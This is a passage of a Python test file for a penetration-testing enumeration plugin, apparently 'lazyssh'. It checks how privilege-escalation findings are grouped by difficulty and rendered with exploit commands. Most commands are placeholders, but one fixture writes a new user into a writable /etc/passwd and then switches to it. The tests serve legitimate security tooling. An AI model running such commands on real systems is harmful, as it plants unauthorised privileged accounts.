    def test_heuristic_evaluator_coverage(self) -> None:
        """Verify every heuristic has a corresponding evaluator."""
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        for h in PRIORITY_HEURISTICS:
            assert h.key in enumerate_plugin.HEURISTIC_EVALUATORS, (
                f"Heuristic '{h.key}' has no evaluator registered"
            )

    def test_critical_severity_style(self) -> None:
        """Verify 'critical' severity is in SEVERITY_STYLES."""
        assert "critical" in enumerate_plugin.SEVERITY_STYLES


class TestGroupQuickWins:
    """Tests for _group_quick_wins helper."""

    def test_groups_by_difficulty(self) -> None:
        """Test that findings are grouped by exploitation difficulty."""
        findings = [
            enumerate_plugin.PriorityFinding(
                key="a",
                category="test",
                severity="critical",
                headline="Instant Win",
                detail="detail",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=["cmd1"],
            ),
            enumerate_plugin.PriorityFinding(
                key="b",
                category="test",
                severity="high",
                headline="Easy Win",
                detail="detail",
                evidence=[],
                exploitation_difficulty="easy",
                exploit_commands=["cmd2"],
            ),
            enumerate_plugin.PriorityFinding(
                key="c",
                category="test",
                severity="medium",
                headline="Moderate Win",
                detail="detail",
                evidence=[],
                exploitation_difficulty="moderate",
                exploit_commands=["cmd3"],
            ),
        ]
        groups = enumerate_plugin._group_quick_wins(findings)
        assert len(groups["instant"]) == 1
        assert len(groups["easy"]) == 1
        assert len(groups["moderate"]) == 1

    def test_excludes_no_exploit_commands(self) -> None:
        """Test that findings without exploit commands are excluded."""
        findings = [
            enumerate_plugin.PriorityFinding(
                key="a",
                category="test",
                severity="high",
                headline="No Exploit",
                detail="detail",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=[],
            ),
        ]
        groups = enumerate_plugin._group_quick_wins(findings)
        assert groups == {}

    def test_excludes_unknown_difficulty(self) -> None:
        """Test that findings with empty difficulty are excluded."""
        findings = [
            enumerate_plugin.PriorityFinding(
                key="a",
                category="test",
                severity="high",
                headline="Unknown Diff",
                detail="detail",
                evidence=[],
                exploitation_difficulty="",
                exploit_commands=["cmd1"],
            ),
        ]
        groups = enumerate_plugin._group_quick_wins(findings)
        assert groups == {}

    def test_empty_findings(self) -> None:
        """Test with no findings."""
        groups = enumerate_plugin._group_quick_wins([])
        assert groups == {}


class TestRenderPlainQuickWins:
    """Tests for Quick Wins rendering in render_plain."""

    def test_quick_wins_section_present(self) -> None:
        """Test that Quick Wins section appears when exploit findings exist."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test_instant",
                category="test",
                severity="critical",
                headline="Writable Passwd",
                detail="detail",
                evidence=["ev1"],
                exploitation_difficulty="instant",
                exploit_commands=["echo 'hacker:...' >> /etc/passwd", "su hacker"],
            ),
        ]
        report = enumerate_plugin.render_plain(snapshot, findings)
        assert "Quick Wins:" in report
        assert "[INSTANT]" in report
        assert "Writable Passwd" in report
        assert "$ echo" in report
        assert "$ su hacker" in report

    def test_quick_wins_multiple_tiers(self) -> None:
        """Test Quick Wins with multiple difficulty tiers."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="a",
                category="test",
                severity="critical",
                headline="Instant Thing",
                detail="d",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=["cmd_instant"],
            ),
            enumerate_plugin.PriorityFinding(
                key="b",
                category="test",
                severity="high",
                headline="Easy Thing",
                detail="d",
                evidence=[],
                exploitation_difficulty="easy",
                exploit_commands=["cmd_easy"],
            ),
        ]
        report = enumerate_plugin.render_plain(snapshot, findings)
        assert "[INSTANT]" in report
        assert "[EASY]" in report
        assert "$ cmd_instant" in report
        assert "$ cmd_easy" in report

    def test_no_quick_wins_section_when_none(self) -> None:
        """Test that Quick Wins section is absent when no exploit findings."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="No Exploit",
                detail="detail",
                evidence=["ev1"],
            ),
        ]
        report = enumerate_plugin.render_plain(snapshot, findings)
        assert "Quick Wins:" not in report

    def test_exploit_commands_inline_in_findings(self) -> None:
        """Test that exploit commands appear inline under findings."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="Exploitable",
                detail="some detail",
                evidence=["ev1"],
                exploitation_difficulty="easy",
                exploit_commands=["# comment line", "exploit_cmd"],
            ),
        ]
        report = enumerate_plugin.render_plain(snapshot, findings)
        assert "Exploit commands:" in report
        assert "# comment line" in report
        assert "$ exploit_cmd" in report

    def test_comment_lines_not_prefixed_with_dollar(self) -> None:
        """Test that comment lines in exploit commands are not prefixed with $."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="Test",
                detail="d",
                evidence=[],
                exploitation_difficulty="easy",
                exploit_commands=["# this is a comment"],
            ),
        ]
        report = enumerate_plugin.render_plain(snapshot, findings)
        # Comment lines should appear without $ prefix
        assert "      # this is a comment" in report
        assert "$ # this is a comment" not in report


class TestRenderRichQuickWins:
    """Tests for Quick Wins rendering in render_rich."""

    def test_render_rich_with_quick_wins(self) -> None:
        """Test render_rich displays Quick Wins panel without crashing."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="critical",
                headline="Quick Win Finding",
                detail="detail",
                evidence=["ev1"],
                exploitation_difficulty="instant",
                exploit_commands=["exploit_cmd1", "# comment"],
            ),
        ]
        # Should not crash
        enumerate_plugin.render_rich(snapshot, findings)

    def test_render_rich_no_quick_wins(self) -> None:
        """Test render_rich without quick wins doesn't crash."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="No Exploits",
                detail="detail",
                evidence=["ev1"],
            ),
        ]
        enumerate_plugin.render_rich(snapshot, findings)

    def test_render_rich_exploit_commands_in_findings(self) -> None:
        """Test render_rich shows exploit commands in findings detail."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="With Exploits",
                detail="exploit available",
                evidence=["ev1"],
                exploitation_difficulty="easy",
                exploit_commands=["# info", "some_exploit_cmd", "another_cmd"],
            ),
        ]
        enumerate_plugin.render_rich(snapshot, findings)


class TestJsonPayloadNewFields:
    """Tests for new fields in JSON payload output."""

    def test_json_payload_includes_exploitation_fields(self) -> None:
        """Test that JSON payload includes exploitation_difficulty and exploit_commands."""
        probes = {"system": {"kernel": _probe("system", "kernel", "5.10.100")}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="critical",
                headline="Test",
                detail="detail",
                evidence=["ev1"],
                exploitation_difficulty="instant",
                exploit_commands=["cmd1", "cmd2"],
            ),
            enumerate_plugin.PriorityFinding(
                key="test2",
                category="test",
                severity="high",
                headline="Test2",
                detail="detail2",
                evidence=[],
            ),
        ]
        plain = enumerate_plugin.render_plain(snapshot, findings)
        payload = enumerate_plugin.build_json_payload(snapshot, findings, plain)

        # Both findings should have the fields
        for f_dict in payload["priority_findings"]:
            assert "exploitation_difficulty" in f_dict
            assert "exploit_commands" in f_dict

        # First finding has populated fields
        assert payload["priority_findings"][0]["exploitation_difficulty"] == "instant"
        assert payload["priority_findings"][0]["exploit_commands"] == ["cmd1", "cmd2"]

        # Second finding has default empty fields
        assert payload["priority_findings"][1]["exploitation_difficulty"] == ""
        assert payload["priority_findings"][1]["exploit_commands"] == []
